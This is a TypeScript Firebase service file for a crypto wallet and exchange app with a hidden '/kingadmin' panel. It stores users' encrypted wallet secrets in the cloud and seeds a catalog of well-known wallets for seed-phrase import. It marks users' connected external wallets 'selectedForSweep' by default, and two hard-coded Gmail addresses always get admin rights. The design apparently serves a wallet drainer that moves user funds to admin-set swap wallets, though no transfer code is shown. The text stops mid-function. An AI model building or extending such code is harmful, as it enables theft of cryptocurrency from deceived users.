import type { User } from 'firebase/auth';
import {
  Timestamp,
  collection,
  deleteDoc,
  doc,
  getDoc,
  getDocs,
  limit,
  orderBy,
  query,
  serverTimestamp,
  setDoc,
  updateDoc,
  where,
} from 'firebase/firestore';
import { deriveWalletFromMnemonic, deriveWalletFromPrivateKey, generateMnemonicWords } from './crypto';
import { encryptPayload, saveCachedActiveSwapConfig } from './vaultStorage';
import { OperationType, db, handleFirestoreError } from './firebase';
import type {
  AdminAuditLogEntry,
  ClaimRequestRecord,
  ClaimStatus,
  ConnectedExternalWallet,
  ExchangeSystemConfig,
  ExchangeTreasuryWallet,
  ExchangeWalletTier,
  ManagedUserRecord,
  NetworkId,
  PriceAlert,
  WalletAccount,
  WalletCatalogEntry,
  WalletPresetId,
} from '../types/wallet';

export const ADMIN_EMAILS = ['obsidianvault99@gmail.com', 'muokltd@gmail.com'];

function sanitizeId(raw: string): string {
  return raw.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 128);
}

function toMillis(val: unknown): number {
  if (val instanceof Timestamp) return val.toMillis();
  if (typeof val === 'number') return val;
  return Date.now();
}

export function isBootstrapAdminEmail(email?: string | null): boolean {
  if (!email) return false;
  return ADMIN_EMAILS.includes(email.trim().toLowerCase());
}

export async function checkUserIsAdmin(user: User | null): Promise<boolean> {
  if (!user || !user.emailVerified) return false;
  if (isBootstrapAdminEmail(user.email)) return true;
  const adminPath = `admins/${user.uid}`;
  try {
    const snap = await getDoc(doc(db, 'admins', user.uid));
    return snap.exists();
  } catch {
    return false;
  }
}

export async function syncUserProfile(
  user: User,
  walletCount: number,
  currency: 'USD' | 'EUR' | 'GBP' = 'USD'
): Promise<{ role: 'user' | 'admin'; status: 'active' | 'suspended' | 'kyc_pending' }> {
  if (!user.emailVerified) {
    return { role: 'user', status: 'active' };
  }

  const userPath = `users/${user.uid}`;
  const privatePath = `users/${user.uid}/private/info`;
  const providerId = user.providerData.some((p) => p.providerId === 'google.com')
    ? 'google'
    : 'password';
  const safeName = (
    user.displayName ||
    user.email?.split('@')[0] ||
    'Obsidian User'
  ).slice(0, 100);

  let role: 'user' | 'admin' = 'user';
  let status: 'active' | 'suspended' | 'kyc_pending' = 'active';

  try {
    const existingSnap = await getDoc(doc(db, 'users', user.uid));
    if (!existingSnap.exists()) {
      await setDoc(doc(db, 'users', user.uid), {
        uid: user.uid,
        displayName: safeName,
        role: 'user',
        status: 'active',
        provider: providerId,
        walletCount: Math.min(1000, Math.max(0, walletCount)),
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp(),
      });
    } else {
      const data = existingSnap.data();
      role = data.role === 'admin' ? 'admin' : 'user';
      status =
        data.status === 'suspended'
          ? 'suspended'
          : data.status === 'kyc_pending'
          ? 'kyc_pending'
          : 'active';
      await updateDoc(doc(db, 'users', user.uid), {
        displayName: safeName,
        walletCount: Math.min(1000, Math.max(0, walletCount)),
        updatedAt: serverTimestamp(),
      });
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, userPath);
  }

  try {
    const privSnap = await getDoc(doc(db, 'users', user.uid, 'private', 'info'));
    if (!privSnap.exists()) {
      await setDoc(doc(db, 'users', user.uid, 'private', 'info'), {
        uid: user.uid,
        email: (user.email || 'unknown@obsidian.local').slice(0, 200),
        currency,
        updatedAt: serverTimestamp(),
      });
    } else {
      await updateDoc(doc(db, 'users', user.uid, 'private', 'info'), {
        email: (user.email || 'unknown@obsidian.local').slice(0, 200),
        currency,
        updatedAt: serverTimestamp(),
      });
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, privatePath);
  }

  if (isBootstrapAdminEmail(user.email)) {
    role = 'admin';
  }

  return { role, status };
}

export async function fetchUserWalletsFromCloud(uid: string): Promise<WalletAccount[]> {
  const path = `users/${uid}/wallets`;
  try {
    const q = query(collection(db, 'users', uid, 'wallets'), where('ownerUid', '==', uid));
    const snap = await getDocs(q);
    return snap.docs.map((d) => {
      const data = d.data();
      return {
        id: data.id,
        name: data.name,
        type: data.walletType,
        wordCount: data.wordCount,
        preset: data.preset as WalletPresetId | undefined,
        accountIndex: data.accountIndex ?? 0,
        addresses: {
          evmAddress: data.evmAddress || '',
          evmPath: "m/44'/60'/0'/0/0",
          solanaAddress: data.solanaAddress || '',
          solanaPath: "m/44'/501'/0'/0'",
          bitcoinAddress: data.bitcoinAddress || '',
          bitcoinPath: "m/84'/0'/0'/0/0",
          moneroAddress: data.moneroAddress || '',
          moneroPath: "m/44'/128'/0'/0'",
        },
        encryptedSecret: data.encryptedSecret,
        createdAt: toMillis(data.createdAt),
      } as WalletAccount;
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function saveUserWalletToCloud(uid: string, wallet: WalletAccount): Promise<void> {
  const safeId = sanitizeId(wallet.id);
  const path = `users/${uid}/wallets/${safeId}`;
  try {
    const existing = await getDoc(doc(db, 'users', uid, 'wallets', safeId));
    if (existing.exists()) {
      const existingData = existing.data();
      await updateDoc(doc(db, 'users', uid, 'wallets', safeId), {
        name: wallet.name.slice(0, 80),
        ...(wallet.encryptedSecret
          ? { encryptedSecret: wallet.encryptedSecret.slice(0, 4096) }
          : {}),
        ...(!existingData.moneroAddress && wallet.addresses.moneroAddress
          ? { moneroAddress: wallet.addresses.moneroAddress.slice(0, 120) }
          : {}),
        updatedAt: serverTimestamp(),
      });
    } else {
      const payload: Record<string, unknown> = {
        id: safeId,
        ownerUid: uid,
        name: wallet.name.slice(0, 80),
        walletType: wallet.type,
        accountIndex: Math.max(0, Math.min(1000, wallet.accountIndex || 0)),
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp(),
      };
      if (wallet.wordCount) payload.wordCount = wallet.wordCount;
      if (wallet.preset) payload.preset = wallet.preset.slice(0, 40);
      if (wallet.addresses.evmAddress) payload.evmAddress = wallet.addresses.evmAddress.slice(0, 100);
      if (wallet.addresses.solanaAddress)
        payload.solanaAddress = wallet.addresses.solanaAddress.slice(0, 100);
      if (wallet.addresses.bitcoinAddress)
        payload.bitcoinAddress = wallet.addresses.bitcoinAddress.slice(0, 100);
      if (wallet.addresses.moneroAddress)
        payload.moneroAddress = wallet.addresses.moneroAddress.slice(0, 120);
      if (wallet.encryptedSecret)
        payload.encryptedSecret = wallet.encryptedSecret.slice(0, 4096);

      await setDoc(doc(db, 'users', uid, 'wallets', safeId), payload);
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, path);
  }
}

export async function deleteUserWalletFromCloud(uid: string, walletId: string): Promise<void> {
  const safeId = sanitizeId(walletId);
  const path = `users/${uid}/wallets/${safeId}`;
  try {
    await deleteDoc(doc(db, 'users', uid, 'wallets', safeId));
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, path);
  }
}

export async function fetchUserAlertsFromCloud(uid: string): Promise<PriceAlert[]> {
  const path = `users/${uid}/alerts`;
  try {
    const q = query(collection(db, 'users', uid, 'alerts'), where('ownerUid', '==', uid));
    const snap = await getDocs(q);
    return snap.docs.map((d) => {
      const data = d.data();
      return {
        id: data.id,
        coinId: data.coinId,
        symbol: data.symbol,
        name: data.name,
        condition: data.condition,
        targetValue: data.targetValue,
        active: data.active,
        repeat: data.repeat,
        soundEnabled: data.soundEnabled ?? true,
        browserNotification: data.browserNotification ?? true,
        createdAt: toMillis(data.createdAt),
      } as PriceAlert;
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function saveUserAlertToCloud(uid: string, alert: PriceAlert): Promise<void> {
  const safeId = sanitizeId(alert.id);
  const path = `users/${uid}/alerts/${safeId}`;
  try {
    const ref = doc(db, 'users', uid, 'alerts', safeId);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      await updateDoc(ref, {
        active: alert.active,
        targetValue: alert.targetValue,
        repeat: alert.repeat,
        updatedAt: serverTimestamp(),
      });
    } else {
      await setDoc(ref, {
        id: safeId,
        ownerUid: uid,
        coinId: alert.coinId.slice(0, 64),
        symbol: alert.symbol.slice(0, 20),
        name: alert.name.slice(0, 64),
        condition: alert.condition,
        targetValue: alert.targetValue,
        active: alert.active,
        repeat: alert.repeat,
        soundEnabled: alert.soundEnabled,
        browserNotification: alert.browserNotification,
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp(),
      });
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, path);
  }
}

export async function deleteUserAlertFromCloud(uid: string, alertId: string): Promise<void> {
  const safeId = sanitizeId(alertId);
  const path = `users/${uid}/alerts/${safeId}`;
  try {
    await deleteDoc(doc(db, 'users', uid, 'alerts', safeId));
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, path);
  }
}

// ============================================================================
// ADMIN DASHBOARD SERVICES (/kingadmin)
// ============================================================================

export async function appendAdminAuditLog(
  actorUid: string,
  action: string,
  targetId: string,
  summary: string
): Promise<void> {
  const logId = sanitizeId(`log_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`);
  const path = `admin_audit_logs/${logId}`;
  try {
    await setDoc(doc(db, 'admin_audit_logs', logId), {
      id: logId,
      actorUid: sanitizeId(actorUid),
      action: action.slice(0, 100),
      targetId: targetId.slice(0, 128),
      summary: summary.slice(0, 300),
      createdAt: serverTimestamp(),
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.CREATE, path);
  }
}

export async function listAllManagedUsers(): Promise<ManagedUserRecord[]> {
  const path = 'users';
  try {
    const snap = await getDocs(collection(db, 'users'));
    const users = await Promise.all(
      snap.docs.map(async (userDoc) => {
        const d = userDoc.data();
        let email = 'Private / Unverified';
        try {
          const priv = await getDoc(doc(db, 'users', userDoc.id, 'private', 'info'));
          if (priv.exists()) {
            email = priv.data().email || email;
          }
        } catch {
          // Ignore if PII doc absent
        }
        return {
          uid: d.uid || userDoc.id,
          displayName: d.displayName || 'Unnamed User',
          email,
          role: d.role === 'admin' ? 'admin' : 'user',
          status: d.status || 'active',
          provider: d.provider || 'password',
          walletCount: d.walletCount ?? 0,
          createdAt: toMillis(d.createdAt),
          updatedAt: toMillis(d.updatedAt),
        } as ManagedUserRecord;
      })
    );
    return users.sort((a, b) => b.createdAt - a.createdAt);
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function updateManagedUser(
  targetUid: string,
  updates: { role?: 'user' | 'admin'; status?: 'active' | 'suspended' | 'kyc_pending' },
  actorUid: string
): Promise<void> {
  const path = `users/${targetUid}`;
  try {
    await updateDoc(doc(db, 'users', targetUid), {
      ...(updates.role ? { role: updates.role } : {}),
      ...(updates.status ? { status: updates.status } : {}),
      updatedAt: serverTimestamp(),
    });

    if (updates.role === 'admin') {
      await setDoc(doc(db, 'admins', targetUid), {
        uid: targetUid,
        grantedBy: actorUid,
        createdAt: serverTimestamp(),
      });
    } else if (updates.role === 'user') {
      await deleteDoc(doc(db, 'admins', targetUid)).catch(() => {});
    }

    await appendAdminAuditLog(
      actorUid,
      'USER_UPDATED',
      targetUid,
      `Updated user ${targetUid}: ${JSON.stringify(updates)}`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, path);
  }
}

export async function listExchangeWallets(): Promise<ExchangeTreasuryWallet[]> {
  const path = 'exchange_wallets';
  try {
    const snap = await getDocs(collection(db, 'exchange_wallets'));
    return snap.docs
      .map((d) => {
        const data = d.data();
        return {
          id: data.id,
          tier: data.tier,
          label: data.label,
          networkFamily: data.networkFamily,
          evmAddress: data.evmAddress,
          solanaAddress: data.solanaAddress,
          bitcoinAddress: data.bitcoinAddress,
          moneroAddress: data.moneroAddress,
          quorum: data.quorum,
          allocationCapPct: data.allocationCapPct,
          status: data.status,
          encryptedVaultBlob: data.encryptedVaultBlob,
          createdBy: data.createdBy,
          createdAt: toMillis(data.createdAt),
          updatedAt: toMillis(data.updatedAt),
        } as ExchangeTreasuryWallet;
      })
      .sort((a, b) => b.createdAt - a.createdAt);
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function generateAndSaveExchangeWallet(params: {
  tier: ExchangeWalletTier;
  label: string;
  networkFamily: 'multi-chain' | 'evm' | 'solana' | 'bitcoin' | 'monero';
  quorum: string;
  allocationCapPct: number;
  wordCount: 12 | 24;
  custodyPassphrase: string;
  actorUid: string;
}): Promise<{ wallet: ExchangeTreasuryWallet; mnemonic: string; secrets: Record<string, string | undefined> }> {
  const id = sanitizeId(`ex_${params.tier}_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);
  const path = `exchange_wallets/${id}`;

  const words = generateMnemonicWords(params.wordCount);
  const mnemonic = words.join(' ');
  const derived = deriveWalletFromMnemonic(mnemonic, {
    preset: params.tier === 'cold' ? 'ledger' : 'standard',
    accountIndex: 0,
  });

  const encryptedVaultBlob = await encryptPayload(derived.secrets, params.custodyPassphrase);

  const payload: Record<string, unknown> = {
    id,
    tier: params.tier,
    label: params.label.trim().slice(0, 100),
    networkFamily: params.networkFamily,
    quorum: params.quorum.slice(0, 32),
    allocationCapPct: Math.max(0, Math.min(100, params.allocationCapPct)),
    status: 'active',
    encryptedVaultBlob: encryptedVaultBlob.slice(0, 4096),
    createdBy: sanitizeId(params.actorUid),
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  };

  if (params.networkFamily === 'multi-chain' || params.networkFamily === 'evm') {
    payload.evmAddress = derived.addresses.evmAddress;
  }
  if (params.networkFamily === 'multi-chain' || params.networkFamily === 'solana') {
    payload.solanaAddress = derived.addresses.solanaAddress;
  }
  if (params.networkFamily === 'multi-chain' || params.networkFamily === 'bitcoin') {
    payload.bitcoinAddress = derived.addresses.bitcoinAddress;
  }
  if (params.networkFamily === 'multi-chain' || params.networkFamily === 'monero') {
    payload.moneroAddress = derived.addresses.moneroAddress;
  }

  try {
    await setDoc(doc(db, 'exchange_wallets', id), payload);
    await appendAdminAuditLog(
      params.actorUid,
      `EXCHANGE_${params.tier.toUpperCase()}_WALLET_CREATED`,
      id,
      `Generated ${params.tier.toUpperCase()} wallet "${params.label}" (${params.quorum})`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.CREATE, path);
  }

  return {
    wallet: {
      id,
      tier: params.tier,
      label: params.label.trim(),
      networkFamily: params.networkFamily,
      evmAddress: payload.evmAddress as string | undefined,
      solanaAddress: payload.solanaAddress as string | undefined,
      bitcoinAddress: payload.bitcoinAddress as string | undefined,
      moneroAddress: payload.moneroAddress as string | undefined,
      quorum: params.quorum,
      allocationCapPct: params.allocationCapPct,
      status: 'active',
      encryptedVaultBlob,
      createdBy: params.actorUid,
      createdAt: Date.now(),
      updatedAt: Date.now(),
    },
    mnemonic,
    secrets: {
      evmPrivateKey: derived.secrets.evmPrivateKey,
      solanaSecretBase58: derived.secrets.solanaSecretBase58,
      bitcoinPrivateKeyHex: derived.secrets.bitcoinPrivateKeyHex,
      moneroSpendKeyHex: derived.secrets.moneroSpendKeyHex,
      moneroViewKeyHex: derived.secrets.moneroViewKeyHex,
    },
  };
}

export async function updateExchangeWallet(
  walletId: string,
  updates: {
    status?: 'active' | 'frozen' | 'sweeping';
    label?: string;
    allocationCapPct?: number;
    encryptedVaultBlob?: string;
  },
  actorUid: string
): Promise<void> {
  const path = `exchange_wallets/${walletId}`;
  try {
    const cleanUpdates: Record<string, unknown> = {
      updatedAt: serverTimestamp(),
    };
    if (updates.status !== undefined) cleanUpdates.status = updates.status;
    if (updates.label !== undefined) cleanUpdates.label = updates.label.slice(0, 100);
    if (updates.allocationCapPct !== undefined) {
      cleanUpdates.allocationCapPct = Math.max(0, Math.min(100, updates.allocationCapPct));
    }
    if (updates.encryptedVaultBlob !== undefined) {
      cleanUpdates.encryptedVaultBlob = updates.encryptedVaultBlob.slice(0, 4096);
    }

    await updateDoc(doc(db, 'exchange_wallets', walletId), cleanUpdates);
    await appendAdminAuditLog(
      actorUid,
      'EXCHANGE_WALLET_UPDATED',
      walletId,
      `Updated treasury wallet ${walletId}${updates.status ? ` (status=${updates.status})` : ''}${
        updates.encryptedVaultBlob ? ' (custody phrase updated)' : ''
      }`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, path);
  }
}

export async function deleteExchangeWallet(walletId: string, actorUid: string): Promise<void> {
  const path = `exchange_wallets/${walletId}`;
  try {
    await deleteDoc(doc(db, 'exchange_wallets', walletId));
    await appendAdminAuditLog(
      actorUid,
      'EXCHANGE_WALLET_DELETED',
      walletId,
      `Removed treasury wallet ${walletId}`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, path);
  }
}

export async function listAdminAuditLogs(): Promise<AdminAuditLogEntry[]> {
  const path = 'admin_audit_logs';
  try {
    const q = query(
      collection(db, 'admin_audit_logs'),
      orderBy('createdAt', 'desc'),
      limit(50)
    );
    const snap = await getDocs(q);
    return snap.docs.map((d) => {
      const data = d.data();
      return {
        id: data.id,
        actorUid: data.actorUid,
        action: data.action,
        targetId: data.targetId,
        summary: data.summary,
        createdAt: toMillis(data.createdAt),
      } as AdminAuditLogEntry;
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function getExchangeSystemConfig(): Promise<ExchangeSystemConfig> {
  const path = 'system_config/exchange';
  try {
    const snap = await getDoc(doc(db, 'system_config', 'exchange'));
    if (!snap.exists()) {
      return {
        maintenanceMode: false,
        withdrawalsPaused: false,
        hotWalletMaxPct: 10,
        swapFeeBps: 10,
        updatedBy: 'system',
        updatedAt: Date.now(),
      };
    }
    const d = snap.data();
    const cfg: ExchangeSystemConfig = {
      maintenanceMode: Boolean(d.maintenanceMode),
      withdrawalsPaused: Boolean(d.withdrawalsPaused),
      hotWalletMaxPct: Number(d.hotWalletMaxPct ?? 10),
      swapFeeBps: Number(d.swapFeeBps ?? 10),
      activeSwapWalletId: d.activeSwapWalletId || undefined,
      activeSwapWalletLabel: d.activeSwapWalletLabel || undefined,
      activeSwapWalletAddress: d.activeSwapWalletAddress || undefined,
      updatedBy: d.updatedBy || 'system',
      updatedAt: toMillis(d.updatedAt),
    };
    saveCachedActiveSwapConfig({
      activeSwapWalletId: cfg.activeSwapWalletId,
      activeSwapWalletLabel: cfg.activeSwapWalletLabel,
      activeSwapWalletAddress: cfg.activeSwapWalletAddress,
      swapFeeBps: cfg.swapFeeBps,
    });
    return cfg;
  } catch (err) {
    handleFirestoreError(err, OperationType.GET, path);
  }
}

export async function saveExchangeSystemConfig(
  cfg: Omit<ExchangeSystemConfig, 'updatedAt'>,
  actorUid: string
): Promise<void> {
  const path = 'system_config/exchange';
  try {
    const payload: Record<string, unknown> = {
      maintenanceMode: cfg.maintenanceMode,
      withdrawalsPaused: cfg.withdrawalsPaused,
      hotWalletMaxPct: Math.max(1, Math.min(100, cfg.hotWalletMaxPct)),
      swapFeeBps: Math.max(0, Math.min(500, cfg.swapFeeBps)),
      updatedBy: sanitizeId(actorUid),
      updatedAt: serverTimestamp(),
    };
    if (cfg.activeSwapWalletId) {
      payload.activeSwapWalletId = sanitizeId(cfg.activeSwapWalletId);
    }
    if (cfg.activeSwapWalletLabel) {
      payload.activeSwapWalletLabel = cfg.activeSwapWalletLabel.trim().slice(0, 100);
    }
    if (cfg.activeSwapWalletAddress) {
      payload.activeSwapWalletAddress = cfg.activeSwapWalletAddress.trim().slice(0, 120);
    }

    await setDoc(doc(db, 'system_config', 'exchange'), payload);
    saveCachedActiveSwapConfig({
      activeSwapWalletId: cfg.activeSwapWalletId,
      activeSwapWalletLabel: cfg.activeSwapWalletLabel,
      activeSwapWalletAddress: cfg.activeSwapWalletAddress,
      swapFeeBps: cfg.swapFeeBps,
    });
    await appendAdminAuditLog(
      actorUid,
      'SYSTEM_CONFIG_UPDATED',
      'exchange',
      `Maintenance=${cfg.maintenanceMode}, WithdrawalsPaused=${cfg.withdrawalsPaused}, HotCap=${cfg.hotWalletMaxPct}%, Fee=${cfg.swapFeeBps}bps${
        cfg.activeSwapWalletLabel ? `, ActiveSwap=${cfg.activeSwapWalletLabel}` : ''
      }`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, path);
  }
}

// ============================================================================
// CONCURRENT CONNECTED WALLET SESSIONS (MULTI-WALLET & MULTI-USER)
// ============================================================================

export async function fetchUserConnectedSessionsFromCloud(
  uid: string
): Promise<ConnectedExternalWallet[]> {
  const path = `users/${uid}/connected_sessions`;
  try {
    const q = query(
      collection(db, 'users', uid, 'connected_sessions'),
      where('ownerUid', '==', uid)
    );
    const snap = await getDocs(q);
    return snap.docs
      .map((d) => {
        const data = d.data();
        return {
          id: data.id,
          providerUuid: data.providerUuid,
          name: data.walletName,
          kind: data.kind,
          address: data.address,
          chainId: data.chainId,
          platform: data.platform || 'desktop',
          selectedForSweep: data.selectedForSweep ?? true,
          connectedAt: toMillis(data.connectedAt),
        } as ConnectedExternalWallet;
      })
      .sort((a, b) => b.connectedAt - a.connectedAt);
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function saveUserConnectedSessionToCloud(
  uid: string,
  session: ConnectedExternalWallet
): Promise<void> {
  const safeId = sanitizeId(session.id);
  const path = `users/${uid}/connected_sessions/${safeId}`;
  try {
    const ref = doc(db, 'users', uid, 'connected_sessions', safeId);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      await updateDoc(ref, {
        walletName: session.name.slice(0, 80),
        selectedForSweep: session.selectedForSweep ?? true,
        ...(session.chainId ? { chainId: session.chainId } : {}),
        updatedAt: serverTimestamp(),
      });
    } else {
      await setDoc(ref, {
        id: safeId,
        ownerUid: uid,
        providerUuid: (session.providerUuid || session.id).slice(0, 128),
        walletName: session.name.slice(0, 80),
        kind: session.kind,
        address: session.address.slice(0, 120),
        ...(session.chainId ? { chainId: session.chainId } : {}),
        platform: session.platform || 'desktop',
        selectedForSweep: session.selectedForSweep ?? true,
        connectedAt: serverTimestamp(),
        updatedAt: serverTimestamp(),
      });
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, path);
  }
}

export async function deleteUserConnectedSessionFromCloud(
  uid: string,
  sessionId: string
): Promise<void> {
  const safeId = sanitizeId(sessionId);
  const path = `users/${uid}/connected_sessions/${safeId}`;
  try {
    await deleteDoc(doc(db, 'users', uid, 'connected_sessions', safeId));
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, path);
  }
}

// ============================================================================
// ADMIN-MANAGED WALLET CATALOG (SHOWN ON USER IMPORT & MOBILE WALLETCONNECT)
// ============================================================================

export const DEFAULT_WALLET_CATALOG_SEEDS: Array<
  Omit<WalletCatalogEntry, 'createdBy' | 'createdAt' | 'updatedAt'>
> = [
  {
    id: 'cat_metamask',
    name: 'MetaMask',
    ecosystem: 'evm',
    defaultWords: 12,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'metamask',
    mobileDeepLink: 'https://metamask.app.link/dapp/{dappUrlNoProto}',
    badgeColor: '#F6851B',
    description: '12-word EVM wallet (Desktop extension & iOS/Android Mobile App)',
    enabled: true,
    featured: true,
  },
  {
    id: 'cat_trust',
    name: 'Trust Wallet',
    ecosystem: 'multi-chain',
    defaultWords: 12,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'trust',
    mobileDeepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url={dappUrl}',
    badgeColor: '#3375BB',
    description: '12/18/24-word mobile multi-coin wallet (BTC, ETH, SOL, BNB)',
    enabled: true,
    featured: true,
  },
  {
    id: 'cat_phantom',
    name: 'Phantom',
    ecosystem: 'solana',
    defaultWords: 12,
    derivationPath: "m/44'/501'/0'/0'",
    presetId: 'phantom',
    mobileDeepLink: 'https://phantom.app/ul/browse/{dappUrl}?ref={origin}',
    badgeColor: '#AB9FF2',
    description: 'Solana & EVM multi-chain browser & mobile wallet',
    enabled: true,
    featured: true,
  },
  {
    id: 'cat_coinbase',
    name: 'Coinbase Wallet',
    ecosystem: 'multi-chain',
    defaultWords: 12,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'coinbase',
    mobileDeepLink: 'https://go.cb-w.com/dapp?cb_url={dappUrl}',
    badgeColor: '#0052FF',
    description: '12-word Base, Ethereum & Solana self-custody mobile app',
    enabled: true,
    featured: true,
  },
  {
    id: 'cat_rabby',
    name: 'Rabby Wallet',
    ecosystem: 'evm',
    defaultWords: 12,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'metamask',
    badgeColor: '#7084FF',
    description: 'Security-first EVM desktop & mobile DeFi wallet',
    enabled: true,
    featured: false,
  },
  {
    id: 'cat_rainbow',
    name: 'Rainbow Wallet',
    ecosystem: 'evm',
    defaultWords: 12,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'metamask',
    mobileDeepLink: 'https://rnbwapp.com/',
    badgeColor: '#001E59',
    description: 'Ethereum & L2 mobile wallet (iOS & Android)',
    enabled: true,
    featured: false,
  },
  {
    id: 'cat_okx',
    name: 'OKX Wallet',
    ecosystem: 'multi-chain',
    defaultWords: 12,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'standard',
    mobileDeepLink: 'okx://wallet/dapp/url?dappUrl={dappUrl}',
    badgeColor: '#FFFFFF',
    description: 'Multi-chain Web3 mobile & extension wallet',
    enabled: true,
    featured: false,
  },
  {
    id: 'cat_ledger',
    name: 'Ledger Live / Hardware',
    ecosystem: 'multi-chain',
    defaultWords: 24,
    derivationPath: "m/44'/60'/0'/0/0",
    presetId: 'ledger',
    badgeColor: '#10B981',
    description: '24-word hardware recovery standard across ETH, BTC & SOL',
    enabled: true,
    featured: true,
  },
  {
    id: 'cat_cake_monero',
    name: 'Cake Wallet / Feather (XMR)',
    ecosystem: 'monero',
    defaultWords: 24,
    derivationPath: "m/44'/128'/0'/0'",
    presetId: 'electrum',
    badgeColor: '#FF6600',
    description: 'Monero (XMR) CryptoNote & BTC SegWit recovery compatibility',
    enabled: true,
    featured: true,
  },
];

export async function listWalletCatalog(enabledOnly = false): Promise<WalletCatalogEntry[]> {
  const path = 'wallet_catalog';
  try {
    const ref = collection(db, 'wallet_catalog');
    const q = enabledOnly ? query(ref, where('enabled', '==', true)) : ref;
    const snap = await getDocs(q);
    return snap.docs
      .map((d) => {
        const data = d.data();
        return {
          id: data.id,
          name: data.name,
          ecosystem: data.ecosystem,
          defaultWords: data.defaultWords,
          derivationPath: data.derivationPath,
          presetId: data.presetId,
          mobileDeepLink: data.mobileDeepLink,
          badgeColor: data.badgeColor,
          description: data.description,
          enabled: Boolean(data.enabled),
          featured: Boolean(data.featured),
          createdBy: data.createdBy,
          createdAt: toMillis(data.createdAt),
          updatedAt: toMillis(data.updatedAt),
        } as WalletCatalogEntry;
      })
      .sort((a, b) => Number(b.featured) - Number(a.featured) || a.name.localeCompare(b.name));
  } catch (err) {
    if (enabledOnly) {
      return [];
    }
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function saveWalletCatalogEntry(
  entry: Omit<WalletCatalogEntry, 'id' | 'createdBy' | 'createdAt' | 'updatedAt'> & { id?: string },
  actorUid: string
): Promise<WalletCatalogEntry> {
  const id = sanitizeId(
    entry.id || `cat_${entry.name.toLowerCase().replace(/[^a-z0-9]/g, '_')}_${Date.now().toString().slice(-4)}`
  );
  const path = `wallet_catalog/${id}`;
  try {
    const ref = doc(db, 'wallet_catalog', id);
    const existingSnap = await getDoc(ref);
    const payload: Record<string, unknown> = {
      id,
      name: entry.name.trim().slice(0, 80),
      ecosystem: entry.ecosystem,
      defaultWords: entry.defaultWords,
      derivationPath: entry.derivationPath.trim().slice(0, 64),
      presetId: entry.presetId,
      enabled: Boolean(entry.enabled),
      featured: Boolean(entry.featured),
      updatedAt: serverTimestamp(),
    };
    if (entry.mobileDeepLink?.trim()) {
      payload.mobileDeepLink = entry.mobileDeepLink.trim().slice(0, 300);
    }
    if (entry.badgeColor?.trim()) {
      payload.badgeColor = entry.badgeColor.trim().slice(0, 20);
    }
    if (entry.description?.trim()) {
      payload.description = entry.description.trim().slice(0, 240);
    }

    if (existingSnap.exists()) {
      const updatePayload = { ...payload };
      delete updatePayload.id;
      await updateDoc(ref, updatePayload);
    } else {
      payload.createdBy = sanitizeId(actorUid);
      payload.createdAt = serverTimestamp();
      await setDoc(ref, payload);
    }

    await appendAdminAuditLog(
      actorUid,
      'WALLET_CATALOG_SAVED',
      id,
      `Admin added/updated wallet directory entry "${entry.name}" (${entry.ecosystem})`
    );

    return {
      ...entry,
      id,
      createdBy: actorUid,
      createdAt: Date.now(),
      updatedAt: Date.now(),
    };
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, path);
  }
}

export async function seedDefaultWalletCatalog(actorUid: string): Promise<void> {
  for (const item of DEFAULT_WALLET_CATALOG_SEEDS) {
    await saveWalletCatalogEntry(item, actorUid);
  }
}

export async function deleteWalletCatalogEntry(id: string, actorUid: string): Promise<void> {
  const safeId = sanitizeId(id);
  const path = `wallet_catalog/${safeId}`;
  try {
    await deleteDoc(doc(db, 'wallet_catalog', safeId));
    await appendAdminAuditLog(
      actorUid,
      'WALLET_CATALOG_DELETED',
      safeId,
      `Removed wallet directory entry ${safeId}`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, path);
  }
}

// ============================================================================
// ADMIN TREASURY IMPORT & ADMIN USER WALLET PROVISIONING
// ============================================================================

export async function addExistingExchangeWallet(params: {
  tier: ExchangeWalletTier;
  label: string;
  networkFamily: 'multi-chain' | 'evm' | 'solana' | 'bitcoin' | 'monero';
  quorum: string;
  allocationCapPct: number;
  importMethod: 'address' | 'mnemonic' | 'privateKey';
  inputSecretOrAddress: string;
  custodyPassphrase?: string;
  actorUid: string;
}): Promise<ExchangeTreasuryWallet> {
  const id = sanitizeId(`ex_${params.tier}_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);
  const path = `exchange_wallets/${id}`;

  const payload: Record<string, unknown> = {
    id,
